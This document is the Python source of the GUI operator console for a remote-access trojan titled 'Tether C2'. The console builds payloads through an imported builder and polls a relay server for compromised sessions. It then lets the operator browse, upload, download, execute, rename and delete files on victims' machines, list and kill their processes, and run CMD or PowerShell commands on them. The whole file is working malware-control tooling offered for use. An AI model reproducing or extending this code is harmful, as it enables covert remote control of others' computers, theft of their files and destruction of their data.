# main.py (Definitive Version)
import sys, time, requests, threading, uuid, os, base64
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QPushButton, QLineEdit, QListWidget, QListWidgetItem, QStackedWidget, QLabel,
                             QTextEdit, QStatusBar, QProgressBar, QTabWidget, QTableWidget,
                             QTableWidgetItem, QHeaderView, QMenu, QComboBox, QFileDialog, QMessageBox,
                             QInputDialog, QAbstractItemView)
from PyQt6.QtCore import QThread, pyqtSignal, Qt, QTimer
from PyQt6.QtGui import QFont, QColor, QPalette, QTextCursor

from config import RELAY_URL, C2_USER
from builder import build_payload
from database import DatabaseManager

class BuildThread(QThread):
    log_message = pyqtSignal(str); finished = pyqtSignal()
    def __init__(self, name, url, user): super().__init__(); self.name, self.url, self.user = name, url, user
    def run(self): build_payload(self.name, self.url, self.user, self.log_message.emit); self.finished.emit()

class C2ServerPoller(QThread):
    sessions_updated = pyqtSignal(dict); responses_received = pyqtSignal(list)
    def __init__(self, main_window):
        super().__init__(); self.main_window = main_window; self.running = True
    def run(self):
        while self.running:
            try:
                response = requests.get(f"{RELAY_URL}/c2/discover", timeout=5)
                if response.status_code == 200: self.sessions_updated.emit(response.json().get("sessions", {}))
            except requests.exceptions.RequestException: pass
            session_id = self.main_window.current_session_id
            if session_id:
                try:
                    response = requests.post(f"{RELAY_URL}/c2/get_responses", json={"session_id": session_id}, timeout=5)
                    if response.status_code == 200 and response.json().get("responses"): self.responses_received.emit(response.json()["responses"])
                except requests.exceptions.RequestException: pass
            time.sleep(3)
    def stop(self): self.running = False

class TransferManager(QThread):
    progress = pyqtSignal(int); finished = pyqtSignal(str)
    def __init__(self, main_window, action, local_path, remote_path):
        super().__init__(); self.main_window = main_window; self.action = action
        self.local_path, self.remote_path = local_path, remote_path; self.chunk_size = 1024 * 512
    def run(self):
        if self.action == "upload": self.upload_file()
        elif self.action == "download": self.download_file()
    def upload_file(self):
        try:
            file_size = os.path.getsize(self.local_path)
            with open(self.local_path, "rb") as f:
                chunk_num = 0
                while True:
                    chunk = f.read(self.chunk_size);
                    if not chunk: break
                    payload = {"action": "upload_chunk", "params": {"path": self.remote_path, "chunk": base64.b64encode(chunk).decode(), "is_first": chunk_num == 0}}
                    response = self.main_window.send_command_and_wait(payload)
                    if not response or response.get('status') != 'success': self.finished.emit(f"Upload chunk failed."); return
                    chunk_num += 1; self.progress.emit(min(100, int(((chunk_num * self.chunk_size) / file_size) * 100)))
            self.finished.emit("Upload Complete")
        except Exception as e: self.finished.emit(f"Upload Failed: {e}")
    def download_file(self):
        try:
            with open(self.local_path, "wb") as f:
                chunk_num = 0
                while True:
                    payload = {"action": "download_chunk", "params": {"path": self.remote_path, "chunk_num": chunk_num}}
                    response = self.main_window.send_command_and_wait(payload)
                    if not response or response.get('status') != 'success': self.finished.emit(f"Download Failed: {response.get('data') if response else 'Timeout'}"); return
                    chunk = base64.b64decode(response['data']['chunk']); f.write(chunk)
                    self.progress.emit((chunk_num * 10) % 100)
                    if response['data']['is_last']: break
                    chunk_num += 1
            self.progress.emit(100); self.finished.emit("Download Complete")
        except Exception as e: self.finished.emit(f"Download Failed: {e}")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__(); self.setWindowTitle("Tether C2"); self.setGeometry(100, 100, 1000, 800)
        self.db = DatabaseManager(); self.current_session_id = None; self.current_path = ""
        self.c2_response_handlers = {}; self.current_processes = []; self.current_directory_items = []
        self.commander_cwd = "C:\\"; self.current_shell = "CMD"; self.protected_text_length = 0
        self.pending_shell_command_id = None

        self.stack = QStackedWidget(); self.setCentralWidget(self.stack)
        self.main_screen = QWidget(); self.manager_screen = QWidget()
        self.stack.addWidget(self.main_screen); self.stack.addWidget(self.manager_screen)
        self.setup_main_ui(); self.setup_manager_ui()
        self.setStatusBar(QStatusBar()); self.progress_bar = QProgressBar()
        self.statusBar().addPermanentWidget(self.progress_bar); self.progress_bar.hide()
        
        self.poller = C2ServerPoller(self)
        self.poller.sessions_updated.connect(self.update_session_list)
        self.poller.responses_received.connect(self.handle_c2_responses)
        self.poller.start()

        self.commander_timeout_timer = QTimer(self)
        self.commander_timeout_timer.setSingleShot(True)
        self.commander_timeout_timer.timeout.connect(self.handle_command_timeout)

    def closeEvent(self, event): self.poller.stop(); self.poller.wait(); event.accept()

    def setup_main_ui(self):
        layout = QVBoxLayout(self.main_screen); builder_box = QHBoxLayout(); layout.addLayout(builder_box)
        self.name_input = QLineEdit(); self.name_input.setPlaceholderText("Enter Payload Name"); builder_box.addWidget(self.name_input)
        self.build_button = QPushButton("Build Payload"); self.build_button.clicked.connect(self.start_build); builder_box.addWidget(self.build_button)
        self.log_box = QTextEdit(); self.log_box.setReadOnly(True); self.log_box.setMaximumHeight(100); layout.addWidget(self.log_box)
        layout.addWidget(QLabel("Live Sessions (Double-click to manage):"))
        self.session_list = QListWidget(); self.session_list.itemDoubleClicked.connect(self.open_manager_panel); layout.addWidget(self.session_list)

    def setup_manager_ui(self):
        layout = QVBoxLayout(self.manager_screen); top_bar = QHBoxLayout(); self.manager_title = QLabel("Managing Session:"); top_bar.addWidget(self.manager_title)
        top_bar.addStretch(); back_button = QPushButton("< Back to Sessions"); back_button.clicked.connect(self.go_to_main_screen); top_bar.addWidget(back_button); layout.addLayout(top_bar)
        delay_notice_label = QLabel("<i>Actions and changes may have a short delay</i>"); delay_notice_label.setAlignment(Qt.AlignmentFlag.AlignCenter); delay_notice_label.setStyleSheet("color: #aaa; padding-bottom: 5px;"); layout.addWidget(delay_notice_label)
        self.tabs = QTabWidget(); self.tabs.currentChanged.connect(self.tab_changed); self.file_explorer_tab = QWidget(); self.process_manager_tab = QWidget(); self.commander_tab = QWidget()
        self.tabs.addTab(self.file_explorer_tab, "File Explorer"); self.tabs.addTab(self.process_manager_tab, "Process Manager"); self.tabs.addTab(self.commander_tab, "Commander")
        layout.addWidget(self.tabs); self.setup_file_explorer_ui(); self.setup_process_manager_ui(); self.setup_commander_ui()

    def setup_file_explorer_ui(self):
        layout = QVBoxLayout(self.file_explorer_tab); nav_bar = QHBoxLayout()
        up_button = QPushButton("⬆️"); up_button.setFixedWidth(40); up_button.clicked.connect(self.navigate_up); nav_bar.addWidget(up_button)
        self.drive_select = QComboBox(); self.drive_select.currentTextChanged.connect(self.navigate_to_drive); nav_bar.addWidget(self.drive_select)
        self.path_input = QLineEdit(); self.path_input.returnPressed.connect(self.navigate_to_path); nav_bar.addWidget(self.path_input, 1); layout.addLayout(nav_bar)
        action_bar = QHBoxLayout(); self.file_search_input = QLineEdit(); self.file_search_input.setPlaceholderText("Search current directory..."); self.file_search_input.textChanged.connect(self.filter_files); action_bar.addWidget(self.file_search_input, 1)
        upload_button = QPushButton("Upload File"); upload_button.clicked.connect(self.upload_file_dialog); action_bar.addWidget(upload_button); layout.addLayout(action_bar)
        self.current_dir_label = QLabel("Current Directory: Not Connected"); self.current_dir_label.setStyleSheet("font-weight: bold; padding: 5px; background-color: #2a2a2a; border-radius: 4px;"); layout.addWidget(self.current_dir_label)
        self.file_table = QTableWidget(); self.file_table.setColumnCount(3); self.file_table.setHorizontalHeaderLabels(["Name", "Type", "Size (Bytes)"])
        self.file_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch); self.file_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers); self.file_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows); self.file_table.doubleClicked.connect(self.file_double_clicked)
        self.file_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.file_table.customContextMenuRequested.connect(self.show_file_context_menu); layout.addWidget(self.file_table)

    def setup_process_manager_ui(self):
        layout = QVBoxLayout(self.process_manager_tab); top_bar = QHBoxLayout()
        refresh_btn = QPushButton("Refresh"); refresh_btn.clicked.connect(self.refresh_processes); top_bar.addWidget(refresh_btn)
        self.process_search_input = QLineEdit(); self.process_search_input.setPlaceholderText("Search by process name..."); self.process_search_input.textChanged.connect(self.filter_processes); top_bar.addWidget(self.process_search_input, 1); layout.addLayout(top_bar)
        self.process_table = QTableWidget(); self.process_table.setColumnCount(4); self.process_table.setHorizontalHeaderLabels(["PID", "Name", "User", "Memory (MB)"])
        self.process_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch); self.process_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers); self.process_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows); self.process_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.process_table.customContextMenuRequested.connect(self.show_process_context_menu); layout.addWidget(self.process_table)
    
    def setup_commander_ui(self):
        layout = QVBoxLayout(self.commander_tab); action_bar = QHBoxLayout()
        action_bar.addWidget(QLabel("Shell Type:")); self.shell_combo = QComboBox(); self.shell_combo.addItems(["CMD", "PowerShell"]); self.shell_combo.currentTextChanged.connect(self.shell_changed)
        action_bar.addWidget(self.shell_combo); action_bar.addStretch(); layout.addLayout(action_bar)
        self.commander_output = QTextEdit(); self.commander_output.setReadOnly(False)
        font = QFont("Consolas", 10); self.commander_output.setFont(font)
        self.commander_output.installEventFilter(self); layout.addWidget(self.commander_output)
        self.shell_changed("CMD")

    def go_to_main_screen(self):
        self.current_session_id = None; self.current_path = ""
        self.current_dir_label.setText("Current Directory: Not Connected")
        self.stack.setCurrentWidget(self.main_screen)

    def start_build(self):
        name = self.name_input.text()
        if not name: QMessageBox.warning(self, "Input Error", "Please provide a name for the payload."); return
        self.build_button.setEnabled(False); self.log_box.clear()
        self.build_thread = BuildThread(name, RELAY_URL, C2_USER); self.build_thread.log_message.connect(self.log_box.append)
        self.build_thread.finished.connect(lambda: self.build_button.setEnabled(True)); self.build_thread.start()

    def open_manager_panel(self, item):
        session_id = item.data(Qt.ItemDataRole.UserRole)
        self.current_session_id = session_id
        self.manager_title.setText(f"<b>Managing Session:</b> ...{session_id[-12:]}"); self.stack.setCurrentWidget(self.manager_screen)
        self.clear_commander_screen()
        self.send_command({"action": "list_drives"}); self.refresh_files("C:\\")

    def update_session_list(self, live_sessions):
        current_selection = self.session_list.currentItem().data(Qt.ItemDataRole.UserRole) if self.session_list.currentItem() else None
        self.session_list.clear()
        for sid, data in sorted(live_sessions.items()):
            item = QListWidgetItem(f"{data.get('hostname', 'N/A')}@{data.get('user', 'N/A')} (ID: ...{sid[-12:]})")
            item.setData(Qt.ItemDataRole.UserRole, sid); self.session_list.addItem(item)
            if sid == current_selection: self.session_list.setCurrentItem(item)

    def send_command(self, payload):
        if not self.current_session_id: return None
        if 'response_id' not in payload: payload['response_id'] = str(uuid.uuid4())
        try:
            requests.post(f"{RELAY_URL}/c2/task", json={"session_id": self.current_session_id, "command": payload}, timeout=10)
            return payload['response_id']
        except requests.exceptions.RequestException as e:
            self.statusBar().showMessage(f"Failed to send command: {e}", 4000)
            return None

    def send_command_and_wait(self, payload):
        response_id = str(uuid.uuid4()); payload['response_id'] = response_id
        response_event = threading.Event(); response_data = None
        def handle_response(response): nonlocal response_data; response_data = response.get('result'); response_event.set()
        self.c2_response_handlers[response_id] = handle_response
        self.send_command(payload)
        if response_event.wait(timeout=30): return response_data
        else: self.statusBar().showMessage("Command timed out waiting for response.", 4000); self.c2_response_handlers.pop(response_id, None); return None

    def handle_c2_responses(self, responses):
        for res in responses:
            response_id = res.get('response_id')
            result_data = res.get('result', {})
            if response_id in self.c2_response_handlers:
                self.c2_response_handlers.pop(response_id)(res)
            elif result_data.get('original_action') == 'run_command':
                self.commander_timeout_timer.stop()
                self.pending_shell_command_id = None
                self.handle_generic_response(result_data)
            else:
                self.handle_generic_response(result_data)

    def handle_generic_response(self, result):
        if result.get('status') == 'success':
            data = result.get('data')
            original_action = result.get('original_action')
            if original_action == 'list_drives':
                self.drive_select.blockSignals(True); self.drive_select.clear(); self.drive_select.addItems(data); self.drive_select.blockSignals(False)
            elif original_action == 'list_directory':
                self.current_path = data.get('path', self.current_path); self.path_input.setText(self.current_path); self.current_dir_label.setText(f"Current Directory: {self.current_path}")
                self.populate_file_table(data['items'])
            elif original_action == 'list_processes': self.populate_process_table(data)
            elif original_action == 'run_command':
                self.commander_cwd = data.get("cwd", self.commander_cwd); self.update_commander_view(data["command_output"])
            elif isinstance(data, str): self.statusBar().showMessage(data, 4000)
        else:
            self.statusBar().showMessage(f"Error from payload: {result.get('data')}", 5000)
            if result.get('original_action') == 'run_command':
                self.update_commander_view(f"Error: {result.get('data')}")

    def tab_changed(self, index):
        if self.stack.currentIndex() != 1: return
        tab_text = self.tabs.tabText(index)
        if tab_text == "Process Manager": self.refresh_processes()
        elif tab_text == "File Explorer":
            if not self.current_path: self.refresh_files("C:\\")
        elif tab_text == "Commander": self.commander_output.setFocus()

    def refresh_files(self, path=None):
        target_path = path if path is not None else self.current_path
        self.send_command({"action": "list_directory", "params": {"path": target_path}})

    def refresh_processes(self): self.send_command({"action": "list_processes"})

    def populate_file_table(self, items, from_master_list=None):
        if from_master_list is None:
            self.current_directory_items = items; self.file_search_input.clear()
        self.file_table.setRowCount(0); sorted_items = sorted(items, key=lambda x: (x['type'] != 'folder', x['name'].lower())); self.file_table.setRowCount(len(sorted_items))
        for row, item in enumerate(sorted_items):
            self.file_table.setItem(row, 0, QTableWidgetItem(item['name'])); self.file_table.setItem(row, 1, QTableWidgetItem(item['type'])); self.file_table.setItem(row, 2, QTableWidgetItem(str(item['size'])))

    def populate_process_table(self, processes, from_master_list=None):
        if from_master_list is None:
            self.current_processes = processes; self.process_search_input.clear()
        self.process_table.setRowCount(0); self.process_table.setRowCount(len(processes))
        for row, item in enumerate(processes):
            self.process_table.setItem(row, 0, QTableWidgetItem(str(item['pid']))); self.process_table.setItem(row, 1, QTableWidgetItem(item['name'])); self.process_table.setItem(row, 2, QTableWidgetItem(str(item.get('username', 'N/A')))); self.process_table.setItem(row, 3, QTableWidgetItem(f"{item.get('memory_mb', 0):.2f}"))

    def filter_files(self):
        search_text = self.file_search_input.text().lower()
        if not search_text: self.populate_file_table(self.current_directory_items); return
        filtered = [item for item in self.current_directory_items if search_text in item['name'].lower()]
        self.populate_file_table(filtered, from_master_list=True)

    def filter_processes(self):
        search_text = self.process_search_input.text().lower()
        if not search_text: self.populate_process_table(self.current_processes); return
        filtered = [proc for proc in self.current_processes if search_text in proc['name'].lower()]
        self.populate_process_table(filtered, from_master_list=True)

    def handle_command_timeout(self):
        self.pending_shell_command_id = None
        self.update_commander_view(f"--- Command timed out, a new prompt has been drawn. ---")

    def shell_changed(self, shell_name):
        self.current_shell = shell_name; palette = self.commander_output.palette()
        if shell_name == "PowerShell":
            palette.setColor(QPalette.ColorRole.Base, QColor(1, 36, 86)); palette.setColor(QPalette.ColorRole.Text, QColor(230, 230, 230))
        else:
            palette.setColor(QPalette.ColorRole.Base, QColor(0, 0, 0)); palette.setColor(QPalette.ColorRole.Text, QColor(220, 220, 220))
        self.commander_output.setPalette(palette)
        self.update_commander_prompt(new_line=True)

    def eventFilter(self, source, event):
        if source is self.commander_output and event.type() == QEvent.Type.KeyPress:
            cursor = self.commander_output.textCursor()
            if cursor.position() < self.protected_text_length:
                if event.key() in [Qt.Key.Key_Backspace, Qt.Key.Key_Delete] or event.text(): return True
            if event.key() in [Qt.Key.Key_Return, Qt.Key.Key_Enter]:
                self.execute_shell_command(); return True
        return super().eventFilter(source, event)
    
    def execute_shell_command(self):
        if self.pending_shell_command_id:
            self.statusBar().showMessage("Waiting for previous command to complete...", 2000); return
        full_text = self.commander_output.toPlainText(); command = full_text[self.protected_text_length:].strip()
        self.commander_output.moveCursor(QTextCursor.MoveOperation.End); self.commander_output.append("")
        if not command:
            self.update_commander_prompt(); return
        if command.lower() in ["cls", "clear"]:
            self.clear_commander_screen(); return
        
        payload = {"action": "run_command", "params": {"command_str": command, "shell_type": self.current_shell}}
        response_id = self.send_command(payload)
        if response_id:
            self.pending_shell_command_id = response_id
            self.commander_timeout_timer.start(15000)

    def clear_commander_screen(self):
        self.commander_output.clear(); self.update_commander_prompt()

    def update_commander_view(self, output):
        if output: self.commander_output.append(output)
        self.update_commander_prompt()

    def update_commander_prompt(self, new_line=False):
        if new_line: self.commander_output.append("")
        prompt_text = f"PS {self.commander_cwd}> " if self.current_shell == "PowerShell" else f"{self.commander_cwd}>"
        self.commander_output.insertHtml(f"<span style='color: #25bc25;'>{prompt_text}</span><span style='color: #ffff00;'>")
        self.commander_output.moveCursor(QTextCursor.MoveOperation.End)
        self.protected_text_length = self.commander_output.textCursor().position()
        
    def navigate_to_drive(self, drive):
        if drive: self.refresh_files(drive)

    def navigate_to_path(self): self.refresh_files(self.path_input.text())

    def navigate_up(self):
        if self.current_path and self.current_path.replace('/', '\\') != os.path.dirname(self.current_path.replace('/', '\\')): self.refresh_files(os.path.dirname(self.current_path.replace('/', '\\')))

    def file_double_clicked(self, index):
        if self.file_table.item(index.row(), 1).text() == 'folder':
            new_path = os.path.join(self.current_path, self.file_table.item(index.row(), 0).text()).replace('\\', '/'); self.refresh_files(new_path)

    def show_file_context_menu(self, position):
        menu = QMenu(); item = self.file_table.itemAt(position)
        if item:
            exec_action = menu.addAction("Execute"); download_action = menu.addAction("Download"); rename_action = menu.addAction("Rename"); delete_action = menu.addAction("Delete"); menu.addSeparator()
        new_folder_action = menu.addAction("New Folder...")
        action = menu.exec(self.file_table.mapToGlobal(position))
        is_destructive = (item and action in [delete_action, rename_action]) or action == new_folder_action
        if is_destructive: QTimer.singleShot(1500, lambda: self.refresh_files(self.current_path))
        if action == new_folder_action:
            name, ok = QInputDialog.getText(self, "New Folder", "Enter folder name:")
            if ok and name: self.send_command({"action": "new_folder", "params": {"path": os.path.join(self.current_path, name).replace('\\', '/')}})
            return
        if not item: return
        file_name = self.file_table.item(item.row(), 0).text(); full_path = os.path.join(self.current_path, file_name).replace('\\', '/')
        if action == exec_action: self.send_command({"action": "execute_file", "params": {"path": full_path}})
        elif action == delete_action:
            if QMessageBox.question(self, "Confirm Delete", f"Delete '{file_name}'?") == QMessageBox.StandardButton.Yes: self.send_command({"action": "delete_file", "params": {"path": full_path}})
        elif action == download_action: self.download_file(full_path)
        elif action == rename_action:
            new_name, ok = QInputDialog.getText(self, f"Rename '{file_name}'", "New name:", text=file_name)
            if ok and new_name and new_name != file_name:
                new_full_path = os.path.join(self.current_path, new_name).replace('\\', '/')
                self.send_command({"action": "rename_path", "params": {"old_path": full_path, "new_path": new_full_path}})

    def show_process_context_menu(self, position):
        item = self.process_table.itemAt(position);
        if not item: return
        pid = int(self.process_table.item(item.row(), 0).text()); menu = QMenu(); kill_action = menu.addAction("Kill")
        action = menu.exec(self.process_table.mapToGlobal(position))
        if action == kill_action:
            self.send_command({"action": "kill_process", "params": {"pid": pid}}); QTimer.singleShot(1000, self.refresh_processes)

    def upload_file_dialog(self):
        local_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload")
        if not local_path: return
        remote_path = os.path.join(self.current_path, os.path.basename(local_path)).replace('\\', '/'); self.statusBar().showMessage(f"Starting upload of {os.path.basename(local_path)}...")
        self.start_transfer("upload", local_path, remote_path)

    def download_file(self, remote_path):
        local_path, _ = QFileDialog.getSaveFileName(self, "Save File As", os.path.basename(remote_path));
        if not local_path: return; self.start_transfer("download", local_path, remote_path)

    def start_transfer(self, action, local_path, remote_path):
        self.transfer_thread = TransferManager(self, action, local_path, remote_path)
        self.transfer_thread.progress.connect(self.update_progress); self.transfer_thread.finished.connect(self.finish_transfer)
        self.progress_bar.show(); self.transfer_thread.start()

    def update_progress(self, value): self.progress_bar.setValue(value)

    def finish_transfer(self, message):
        self.statusBar().showMessage(message, 5000); self.progress_bar.hide()
        if "Complete" in message: QTimer.singleShot(500, lambda: self.refresh_files(self.current_path))

if __name__ == '__main__':
    try:
        app = QApplication(sys.argv); window = MainWindow(); window.show(); sys.exit(app.exec())
    except Exception as e:
        print("[!!!] A FATAL ERROR OCCURRED ON STARTUP:"); print(f"ERROR: {e}")
        import traceback; traceback.print_exc(); input("\nPress ENTER to exit.")